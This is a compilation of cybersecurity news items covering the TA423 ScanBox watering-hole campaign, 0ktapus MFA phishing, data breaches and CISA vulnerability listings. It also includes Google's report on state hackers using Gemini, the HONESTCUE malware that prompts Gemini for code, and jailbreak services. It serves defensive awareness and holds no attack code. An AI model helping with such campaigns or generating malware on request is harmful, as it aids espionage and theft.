Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
────────────────────────────────────────────────────────────────────────────────

Link: https://securityaffairs.com/187958/ai/google-state-backed-hackers-exploit-gemini-ai-for-cyber-recon-and-attacks.html

[TAM METİN - 639 kelime]
Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.

Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.

Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.

“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “

Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.

In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.

In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.

Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.

Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.

Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.

“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.

[TAM METİN - 358 kelime]
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities (KEV) catalog.

The first flaw added to the catalog is a Microsoft Configuration Manager SQL Injection Vulnerability tracked as CVE-2024-43468. An unauthenticated attacker could send specially crafted requests to the system and trigger unsafe processing, allowing them to execute commands on the server or underlying database.

The second flaw added to the catalog is a Notepad++ Download of Code Without Integrity Check tracked as CVE-2025-15556. Vulnerability. Notepad++ versions before 8.8.9 using WinGUp have a flaw where updates aren’t verified. An attacker intercepting update traffic can make the updater run a malicious installer, allowing arbitrary code execution with the user’s privileges.

The third flaw added to the catalog is a security control bypass vulnerability, tracked as CVE-2025-40536, that could allow an unauthenticated attacker to access certain restricted functionality within Web Help Desk. While more limited in scope than the critical flaws, successful exploitation could still expose sensitive features and weaken the application’s overall security posture.

The last flaw added to the catalog is an Apple Multiple Buffer Overflow Vulnerability tracked as CVE-2026-20700.

This week, Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.

Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the vulnerabilities by March 5, 2026, except CVE-2025-40536, which must be solved by February 15, 2026.

[TAM METİN - 423 kelime]
Hackers broke into Dutch telecom firm Odido and accessed data from 6.2 million accounts. The company confirmed the breach and said attackers took names, addresses, phone numbers, email addresses, bank account details, dates of birth, and passport or ID numbers.

“Odido has been hit by a cyberattack, which compromised customer data. This involved personal data from a customer contact system used by Odido. No passwords, call logs, or billing information were affected.” reads a notice published by the company on its website. “The unauthorized access to the system was terminated as quickly as possible. Odido also engaged external cybersecurity experts to assist with implementing additional security measures as part of the incident response.”

The telco said the breach did not expose My Odido account passwords, call records, location data, invoice details, or scans of ID documents.

Odido’s subsidiary Ben also warned its customers that hackers may have stolen their information.

Odido lekt gevoelige gegevens 6,2 miljoen gebruikers: https://t.co/dK8jzwmYY9Adressen, telefoonnummers, geboortedata, emailadressen, bankrekeningnummers, identiteitsbewijzen.. #privacy pic.twitter.com/E5k1aiERfm

Odido is a Dutch telecommunications company and one of the largest mobile network operators in the Netherlands. It was formed when T-Mobile Netherlands and Tele2 were rebranded as Odido in 2023 after private equity firms Apax Partners and Warburg Pincus acquired the business.

Odido serves around 8 million mobile subscribers and about 1 million fixed broadband customers nationwide. The company provides mobile telephony, wireless broadband, and related services under multiple brands including Odido, Ben, and Simpel.

Financially, Odido generates around €2 billion in annual revenue, with growth in consumer broadband and business mobile services contributing to its topline

The telco discovered the hack last weekend and reported it to the Dutch privacy watchdog. The company said it quickly stopped the unauthorized access and brought in cybersecurity experts to strengthen its defenses.

“The unauthorised access to the system was ended as quickly as possible,” the company said in a statement. “In addition, Odido has brought in cybersecurity experts to implement additional security measures in response to this incident.”

The company urges customers to stay alert for suspicious activity. Criminals may use stolen details to pose as Odido, banks, or other companies through calls, texts, or emails. Avoid clicking unknown links and check senders carefully. Verify unexpected calls by contacting the company directly using official numbers. Never share passwords or PINs. Review invoices closely, as scammers may send fake payment requests. When in doubt, check your account or contact customer support.

The company did not disclose technical details about the attack.

[17] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/polish-hacker-charged-seven-years-after-massive-morele-net-data-breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelved after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[19] SANS ISC - AI-Powered Knowledge Graph Generator &#x26; APTs, (Thu, Feb 12th)

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

[23] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

